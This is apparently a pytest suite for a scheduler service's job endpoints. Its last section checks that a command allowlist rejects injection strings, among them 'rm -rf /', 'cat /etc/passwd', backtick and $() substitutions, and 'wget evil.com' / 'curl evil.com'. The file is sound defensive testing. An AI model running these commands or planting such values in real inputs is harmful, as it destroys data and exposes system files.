"""Tests for routers/scheduler.py — scheduler REST endpoints."""

from __future__ import annotations

from unittest.mock import patch

import pytest

from dawos_agent.services import scheduler


@pytest.fixture(autouse=True)
def _reset():
    scheduler._jobs.clear()
    for t in list(scheduler._running_tasks.values()):
        t.cancel()
    scheduler._running_tasks.clear()
    yield
    scheduler._jobs.clear()
    for t in list(scheduler._running_tasks.values()):
        t.cancel()
    scheduler._running_tasks.clear()


@pytest.mark.asyncio
async def test_list_jobs_empty(client, headers):
    resp = await client.get("/api/v1/scheduler/jobs", headers=headers)
    assert resp.status_code == 200
    assert resp.json()["count"] == 0


@pytest.mark.asyncio
async def test_add_job(client, headers):
    resp = await client.post(
        "/api/v1/scheduler/jobs",
        json={
            "name": "test",
            "command": "accel-cmd show stat",
            "interval_seconds": 60,
            "enabled": False,
        },
        headers=headers,
    )
    assert resp.status_code == 201
    assert resp.json()["name"] == "test"


@pytest.mark.asyncio
async def test_add_job_duplicate(client, headers):
    scheduler.add_job("dup", "echo 1", 60, enabled=False)
    resp = await client.post(
        "/api/v1/scheduler/jobs",
        json={
            "name": "dup",
            "command": "accel-cmd show version",
            "interval_seconds": 60,
        },
        headers=headers,
    )
    assert resp.status_code == 409


@pytest.mark.asyncio
async def test_add_job_error(client, headers):
    with patch(
        "dawos_agent.routers.scheduler.scheduler.add_job",
        side_effect=Exception("boom"),
    ):
        resp = await client.post(
            "/api/v1/scheduler/jobs",
            json={
                "name": "x",
                "command": "accel-cmd show stat",
                "interval_seconds": 60,
            },
            headers=headers,
        )
    assert resp.status_code == 500


@pytest.mark.asyncio
async def test_remove_job(client, headers):
    scheduler.add_job("rm", "echo bye", 60, enabled=False)
    resp = await client.delete("/api/v1/scheduler/jobs/rm", headers=headers)
    assert resp.status_code == 204


@pytest.mark.asyncio
async def test_remove_job_not_found(client, headers):
    resp = await client.delete("/api/v1/scheduler/jobs/ghost", headers=headers)
    assert resp.status_code == 404


@pytest.mark.asyncio
async def test_run_job(client, headers):
    with patch(
        "dawos_agent.routers.scheduler.scheduler.run_job",
        return_value={
            "output": "ok",
            "returncode": 0,
            "timestamp": "2025-01-01T00:00:00",
        },
    ):
        scheduler._jobs["exec"] = {
            "name": "exec",
            "command": "echo ok",
            "interval_seconds": 60,
            "enabled": False,
            "last_run": None,
            "last_result": None,
            "run_count": 0,
        }
        resp = await client.post("/api/v1/scheduler/jobs/exec/run", headers=headers)

    assert resp.status_code == 200
    assert resp.json()["success"] is True


@pytest.mark.asyncio
async def test_run_job_not_found(client, headers):
    with patch(
        "dawos_agent.routers.scheduler.scheduler.run_job",
        side_effect=KeyError("not found"),
    ):
        resp = await client.post("/api/v1/scheduler/jobs/ghost/run", headers=headers)
    assert resp.status_code == 404


@pytest.mark.asyncio
async def test_run_job_error(client, headers):
    with patch(
        "dawos_agent.routers.scheduler.scheduler.run_job",
        side_effect=Exception("fail"),
    ):
        resp = await client.post("/api/v1/scheduler/jobs/crash/run", headers=headers)
    assert resp.status_code == 500


@pytest.mark.asyncio
async def test_scheduler_requires_auth(client, bad_headers):
    resp = await client.get("/api/v1/scheduler/jobs", headers=bad_headers)
    assert resp.status_code == 401


# ---------------------------------------------------------------------------
# Command allowlist validation (QA-160726 / DAWOS-01)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_add_job_rejects_shell_metachar(client, headers):
    """Commands with shell metacharacters must be rejected (422)."""
    for evil in [
        "accel-cmd show stat; rm -rf /",
        "accel-cmd show stat | cat /etc/passwd",
        "accel-cmd show stat && echo pwned",
        "accel-cmd show stat `whoami`",
        "accel-cmd show stat $(id)",
    ]:
        resp = await client.post(
            "/api/v1/scheduler/jobs",
            json={"name": "evil", "command": evil, "interval_seconds": 60},
            headers=headers,
        )
        assert resp.status_code == 422, f"Expected 422 for: {evil}"


@pytest.mark.asyncio
async def test_add_job_rejects_non_allowlisted(client, headers):
    """Commands not in the allowlist must be rejected (422)."""
    for cmd in ["echo hello", "rm -rf /", "wget evil.com", "curl evil.com"]:
        resp = await client.post(
            "/api/v1/scheduler/jobs",
            json={"name": "bad", "command": cmd, "interval_seconds": 60},
            headers=headers,
        )
        assert resp.status_code == 422, f"Expected 422 for: {cmd}"


@pytest.mark.asyncio
async def test_add_job_accepts_allowlisted_commands(client, headers):
    """All allowlisted command prefixes must be accepted."""
    safe = [
        "accel-cmd show stat",
        "accel-cmd show sessions",
        "uptime",
        "free -m",
        "df -h",
        "ip addr show",
        "nft list ruleset",
        "ss -s",
    ]
    for i, cmd in enumerate(safe):
        resp = await client.post(
            "/api/v1/scheduler/jobs",
            json={
                "name": f"safe-{i}",
                "command": cmd,
                "interval_seconds": 60,
                "enabled": False,
            },
            headers=headers,
        )
        assert resp.status_code == 201, f"Expected 201 for: {cmd}"
